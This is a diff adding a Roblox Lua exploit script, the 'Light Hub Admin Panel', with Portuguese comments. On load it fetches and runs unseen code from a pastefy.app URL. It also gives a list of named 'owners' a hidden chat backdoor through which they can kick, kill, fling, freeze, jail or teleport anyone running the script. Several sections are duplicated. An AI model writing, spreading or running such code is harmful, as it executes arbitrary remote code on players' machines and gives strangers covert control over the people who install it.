@@ -1,0 +1,579 @@
+-- Serviços
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Lista de donos autorizados
+local Donos = {
+    ["hiro0881"] = true,
+    ["jifhgiu"] = true,
+    ["cartolahub7"] = true,
+    ["ppyszt"] = true,
+    ["pedro_roneido"] = true,
+    ["pedro_roneido20"] = true,
+    ["ixi362"] = true,
+    ["rafaelgms7810396"] = true,
+    ["piloto158d"] = true,
+    ["rafaelgms67901"] = true,
+    ["ilu1_22"] = true,
+    ["xmarcelo_27262"] = true,
+    ["ryansididd"] = true,
+    ["redz_hub99975"] = true,
+    ["amongus23445844sad"] = true,
+    ["teteu0902201mc"] = true,
+    ["ttyyryjuh"] = true,
+    ["kevin_oliverra10"] = true,
+    ["drakeee777"] = true,
+    ["eduard0k0"] = true,
+    ["gh707080s"] = true,
+    ["luroblox1262"] = true,
+}
+
+-- Lista de usuários especiais
+local SpecialUsers = {
+    ["hiro0881"] = "Dono",
+    ["jifhgiu"] = "Usuário adm",
+    ["cartolahub7"] = "Usuário adm",
+    ["ppyszt"] = "Usuário adm",
+    ["pedro_roneido"] = "Usuário adm",
+    ["pedro_roneido20"] = "Usuário adm",
+    ["ixi362"] = "Usuário adm",
+    ["rafaelgms7810396"] = "Usuário adm",
+    ["piloto158d"] = "Usuário adm",
+    ["rafaelgms67901"] = "Usuário adm",
+    ["ilu1_22"] = "Usuário adm",
+    ["xmarcelo_27262"] = "Usuário adm",
+    ["ryansididd"] = "Usuário adm",
+    ["redz_hub99975"] = "Usuário adm",
+    ["teteu0902201mc"] = "Usuário adm",
+    ["amongus23445844sad"] = "Usuário adm",
+    ["ttyyryjuh"] = "Usuário adm",
+    ["kevin_oliverra10"] = "Usuário adm",
+    ["drakeee777"] = "Usuário adm",
+    ["eduard0k0"] = "Usuário adm",
+    ["gh707080s"] = "Usuário adm",
+    ["luroblox1262"] = "Usuário adm",
+}
+
+-- Serviço
+
+local Players = game:GetService("Players")
+
+-- Lista de usuários especiais
+
+local SpecialUsers = {
+    ["hiro0881"] = "Dono",
+    ["jifhgiu"] = "Usuário adm",
+    ["cartolahub7"] = "Usuário adm",
+    ["ppyszt"] = "Usuário adm",
+    ["pedro_roneido"] = "Usuário adm",
+    ["pedro_roneido20"] = "Usuário adm",
+    ["ixi362"] = "Usuário adm",
+    ["rafaelgms7810396"] = "Usuário adm",
+    ["piloto158d"] = "Usuário adm",
+    ["rafaelgms67901"] = "Usuário adm",
+    ["ilu1_22"] = "Usuário adm",
+    ["xmarcelo_27262"] = "Usuário adm",
+    ["ryansididd"] = "Usuário adm",
+    ["redz_hub99975"] = "Usuário adm",
+    ["teteu0902201mc"] = "Usuário adm",
+    ["amongus23445844sad"] = "Usuário adm",
+    ["ttyyryjuh"] = "Usuário adm",
+    ["kevin_oliverra10"] = "Usuário adm",
+    ["drakeee777"] = "Usuário adm",
+    ["eduard0k0"] = "Usuário adm",
+    ["gh707080s"] = "Usuário adm",
+    ["luroblox1262"] = "Usuário adm",
+}
+
+local function createSpecialTag(player, tagText)
+
+    local char = player.Character
+
+    if not char then return end
+
+    local head = char:FindFirstChild("Head")
+
+    if not head then return end
+
+    local old = head:FindFirstChild("SpecialTag")
+
+    if old then old:Destroy() end
+
+    local billboardGui = Instance.new("BillboardGui")
+
+    billboardGui.Name = "SpecialTag"
+
+    billboardGui.Size = UDim2.new(0, 200, 0, 50)
+
+    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
+
+    billboardGui.Adornee = head
+
+    billboardGui.AlwaysOnTop = true
+
+    billboardGui.Parent = head
+
+    local frame = Instance.new("Frame")
+
+    frame.Size = UDim2.new(1, 0, 1, 0)
+
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+    frame.BackgroundTransparency = 0.5
+
+    frame.BorderSizePixel = 0
+
+    frame.Parent = billboardGui
+
+    local corner = Instance.new("UICorner")
+
+    corner.CornerRadius = UDim.new(0, 12)
+
+    corner.Parent = frame
+
+    local textLabel = Instance.new("TextLabel")
+
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+
+    textLabel.BackgroundTransparency = 1
+
+    textLabel.Text = tagText
+
+    textLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+
+    textLabel.TextScaled = true
+
+    textLabel.Font = Enum.Font.GothamBold
+
+    textLabel.TextStrokeTransparency = 0.5
+
+    textLabel.Parent = frame
+
+end
+
+local function applyTag(player)
+
+    local tagType = SpecialUsers[player.Name:lower()]
+
+    if tagType then
+
+        player.CharacterAdded:Connect(function()
+
+            task.wait(1)
+
+            createSpecialTag(player, tagType)
+
+        end)
+
+        if player.Character then
+
+            task.wait(1)
+
+            createSpecialTag(player, tagType)
+
+        end
+
+    end
+
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+
+    applyTag(p)
+
+end
+
+Players.PlayerAdded:Connect(function(p)
+
+    applyTag(p)
+
+end)
+
+-- Aplica em todos que já estão no jogo
+for _, p in ipairs(Players:GetPlayers()) do
+    applyTag(p)
+end
+
+-- Aplica para quem entrar depois
+Players.PlayerAdded:Connect(function(p)
+    applyTag(p)
+end)
+
+-- Executa Fire Carregamento para todos
+local success, errorMsg = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/iesrRAJH/raw"))()
+end)
+
+if not success then
+    warn("Erro ao carregar o hub principal: " .. tostring(errorMsg))
+end
+
+-- Sistema de comandos para todos os usuários do hub
+local playerOriginalSpeed = {}
+local jaulas = {}
+local jailConnections = {}
+
+-- Função para processar comandos locais (executados pelo próprio usuário)
+local function ExecutarComandoLocal(comando, targetName)
+    local playerName = LocalPlayer.Name:lower()
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    
+    -- Verifica se o comando é para o próprio jogador
+    local isSelfTarget = not targetName or targetName:lower() == playerName
+    
+    -- Kick
+    if comando == "kick" and isSelfTarget then
+        LocalPlayer:Kick("Você foi removido pelo Painel ADM do Light hub.")
+        return
+    end
+
+    -- Kill
+    if comando == "kill" and isSelfTarget then
+        if character then 
+            character:BreakJoints() 
+        end
+        return
+    end
+
+    -- KillPlus
+    if comando == "killplus" and isSelfTarget then
+        if character then
+            character:BreakJoints()
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 10 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(10,10,10)
+                    part.Anchored = false
+                    part.CanCollide = false
+                    part.Material = Enum.Material.Neon
+                    part.BrickColor = BrickColor.Random()
+                    part.CFrame = root.CFrame
+                    part.Parent = workspace
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                    bv.Parent = part
+                    game.Debris:AddItem(part, 3)
+                end
+            end
+        end
+        return
+    end
+
+    -- Fling
+    if comando == "fling" and isSelfTarget then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local targetCFrame = CFrame.new(50000, 5000000, 3972823)
+                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
+                local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
+                tween:Play()
+            end
+        end
+        return
+    end
+
+    -- Freeze
+    if comando == "freeze" and isSelfTarget then
+        if humanoid then
+            playerOriginalSpeed[playerName] = humanoid.WalkSpeed
+            humanoid.WalkSpeed = 0
+        end
+        return
+    end
+
+    -- Unfreeze
+    if comando == "unfreeze" and isSelfTarget then
+        if humanoid then
+            humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
+            playerOriginalSpeed[playerName] = nil
+        end
+        return
+    end
+
+    -- Jail
+    if comando == "jail" and isSelfTarget then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if root and humanoid then
+                playerOriginalSpeed[playerName] = humanoid.WalkSpeed
+                humanoid.WalkSpeed = 0
+
+                local sizeX,sizeY,sizeZ = 10,10,10
+                local pos = root.Position
+                jaulas[playerName] = {}
+                
+                local function criarParte(cframe,size)
+                    local p = Instance.new("Part")
+                    p.Size = size
+                    p.Anchored = true
+                    p.CanCollide = true
+                    p.Transparency = 0.5
+                    p.Color = Color3.fromRGB(255,140,0)
+                    p.CFrame = cframe
+                    p.Parent = workspace
+                    table.insert(jaulas[playerName], p)
+                end
+                
+                criarParte(CFrame.new(pos+Vector3.new(sizeX/2,0,0)),Vector3.new(1,sizeY,sizeZ))
+                criarParte(CFrame.new(pos+Vector3.new(-sizeX/2,0,0)),Vector3.new(1,sizeY,sizeZ))
+                criarParte(CFrame.new(pos+Vector3.new(0,0,sizeZ/2)),Vector3.new(sizeX,sizeY,1))
+                criarParte(CFrame.new(pos+Vector3.new(0,0,-sizeZ/2)),Vector3.new(sizeX,sizeY,1))
+                criarParte(CFrame.new(pos+Vector3.new(0,sizeY/2,0)),Vector3.new(sizeX,1,sizeZ))
+                criarParte(CFrame.new(pos+Vector3.new(0,-sizeY/2,0)),Vector3.new(sizeX,1,sizeZ))
+
+                if jailConnections[playerName] then
+                    jailConnections[playerName]:Disconnect()
+                end
+                
+                jailConnections[playerName] = RunService.Heartbeat:Connect(function()
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        local hrp = LocalPlayer.Character.HumanoidRootPart
+                        local center = pos + Vector3.new(0,2,0)
+                        if (hrp.Position - center).Magnitude > 6 then
+                            hrp.CFrame = CFrame.new(center)
+                        end
+                    end
+                end)
+            end
+        end
+        return
+    end
+
+    -- Unjail
+    if comando == "unjail" and isSelfTarget then
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
+                playerOriginalSpeed[playerName] = nil
+            end
+
+            if jaulas[playerName] then
+                for _, p in ipairs(jaulas[playerName]) do
+                    p:Destroy()
+                end
+                jaulas[playerName] = nil
+            end
+
+            if jailConnections[playerName] then
+                jailConnections[playerName]:Disconnect()
+                jailConnections[playerName] = nil
+            end
+        end
+        return
+    end
+
+    -- Bring (para outros jogadores)
+    if comando == "bring" and targetName and targetName:lower() ~= playerName then
+        local targetPlayer = Players:FindFirstChild(targetName)
+        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local root = character and character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
+            end
+        end
+        return
+    end
+end
+
+-- Função para enviar comandos pelo chat
+local function EnviarComando(comando, playerName)
+    local msg = ";"..comando
+    if playerName then 
+        msg = msg.." "..playerName 
+    end
+    
+    -- Executa localmente primeiro
+    ExecutarComandoLocal(comando, playerName)
+    
+    -- Depois envia pelo chat
+    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+    if canal then
+        canal:SendAsync(msg)
+    else
+        warn("Nenhum canal encontrado")
+    end
+end
+
+-- Função para processar comandos recebidos do chat
+local function ProcessarComandoChat(msgText, autor)
+    local playerName = LocalPlayer.Name:lower()
+    
+    -- Verifica comandos direcionados a este jogador
+    for _, cmd in ipairs({"kick", "kill", "killplus", "fling", "freeze", "unfreeze", "jail", "unjail"}) do
+        local pattern = ";("..cmd..")%s+"..playerName
+        local comandoEncontrado = msgText:match(pattern)
+        if comandoEncontrado then
+            ExecutarComandoLocal(comandoEncontrado, playerName)
+            return
+        end
+    end
+    
+    -- Verifica comando bring
+    local bringPattern = ";(bring)%s+(%w+)"
+    local comando, alvo = msgText:match(bringPattern)
+    if comando == "bring" and alvo and alvo:lower() == playerName then
+        ExecutarComandoLocal("bring", autor) -- Inverte para trazer o autor até mim
+        return
+    end
+    
+    -- Verifica comando verifique
+    if msgText:match(";verifique") then
+        pcall(function()
+            local randomNumber = math.random(1000, 9999)
+            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if channel then
+                channel:SendAsync("LightHub10"..randomNumber)
+            end
+        end)
+        return
+    end
+end
+
+-- Se for dono, ativa o painel admin completo
+if Donos[LocalPlayer.Name:lower()] then
+    -- Carrega a biblioteca WindUI
+    local WindUISuccess, WindUI = pcall(function()
+        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+    end)
+
+    if not WindUISuccess then
+        warn("Erro ao carregar WindUI")
+        return
+    end
+
+    local Window = WindUI:CreateWindow({
+        Title = "Light Admin",
+        Icon = "bodies",
+        Author = "by: hiro",
+        Folder = "PainelLight",
+        Size = UDim2.fromOffset(500, 400),
+        Transparent = true,
+        Theme = "Dark",
+        Resizable = false,
+        SideBarWidth = 200,
+        BackgroundImageTransparency = 0.42,
+        HideSearchBar = true,
+        ScrollBarEnabled = true,
+    })
+
+    -- Aba Comandos
+    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
+    local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })
+
+    local TargetName
+    local function getPlayersList()
+        local t = {}
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                table.insert(t, p.Name)
+            end
+        end
+        return t
+    end
+
+    local Dropdown = SectionComandos:Dropdown({
+        Title = "Selecionar Jogador",
+        Values = getPlayersList(),
+        Value = "",
+        Callback = function(option)
+            TargetName = option
+        end
+    })
+
+    Players.PlayerAdded:Connect(function()
+        Dropdown:SetValues(getPlayersList())
+    end)
+    
+    Players.PlayerRemoving:Connect(function()
+        Dropdown:SetValues(getPlayersList())
+    end)
+
+    local comandosAlvo = {"kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail"}
+
+    for _, cmd in ipairs(comandosAlvo) do
+        SectionComandos:Button({
+            Title = cmd:upper(),
+            Desc = "Envia ;"..cmd.." no chat para o jogador selecionado",
+            Callback = function()
+                if TargetName then
+                    EnviarComando(cmd, TargetName)
+                else
+                    WindUI:Notify({
+                        Title = "Erro",
+                        Desc = "Nenhum jogador selecionado!",
+                        Theme = "Midnight"
+                    })
+                end
+            end
+        })
+    end
+
+    -- Aba Verify
+    local TabVerify = Window:Tab({ Title = "Verify", Icon = "check", Locked = false })
+    local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
+    
+    SectionVerify:Button({
+        Title = "Enviar Verificação",
+        Desc = "Envia ;verifique no chat",
+        Callback = function()
+            EnviarComando("verifique")
+        end
+    })
+
+    -- Notificação de sucesso
+    WindUI:Notify({
+        Title = "Painel Admin Carregado",
+        Desc = "Painel administrativo ativado com sucesso!",
+        Theme = "Midnight"
+    })
+end
+
+-- Conectar chat para processar comandos recebidos
+local function ConectarChat()
+    for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
+        if channel:IsA("TextChannel") then
+            channel.MessageReceived:Connect(function(message)
+                if message.TextSource and message.Text then
+                    ProcessarComandoChat(message.Text:lower(), message.TextSource.Name:lower())
+                end
+            end)
+        end
+    end
+end
+
+-- Inicializa a conexão do chat
+ConectarChat()
+
+TextChatService.TextChannels.ChildAdded:Connect(function(channel)
+    if channel:IsA("TextChannel") then
+        channel.MessageReceived:Connect(function(message)
+            if message.TextSource and message.Text then
+                ProcessarComandoChat(message.Text:lower(), message.TextSource.Name:lower())
+            end
+        end)
+    end
+end)
+
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    ConectarChat()
+end)
+
+-- Som de conclusão
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://8486683243"
+sound.Volume = 0.5
+sound.PlayOnRemove = true
+sound.Parent = workspace
+sound:Destroy()
+
+print("Light Hub Admin Panel carregado com sucesso!")
